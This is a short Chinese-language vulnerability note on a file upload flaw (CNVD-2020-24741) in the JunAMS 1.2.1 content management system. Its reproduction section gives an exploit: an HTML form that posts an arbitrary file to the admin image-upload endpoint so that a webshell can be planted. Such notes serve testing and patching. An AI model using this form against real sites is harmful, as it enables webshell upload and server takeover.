# JunAms内容管理系统文件上传漏洞 CNVD-2020-24741

## 漏洞描述

JunAMS是一款以ThinkPHP为框架的开源内容管理系统。

JunAMS内容管理系统存在文件上传漏洞，攻击者可利用该漏洞上传webshell，获取服务器权限。

参考链接：

- https://www.cnvd.org.cn/flaw/show/CNVD-2020-24741

## 漏洞影响

```
JunAMS junAMS 1.2.1.20190403
```

## 漏洞复现

exp：

```
<form enctype="multipart/form-data" action="http://localhost//admin.php/common/add_images.html" method="post">  
<input type="file" name="file" size="50"><br>  
<input type="submit" value="Upload">  
</form>
```

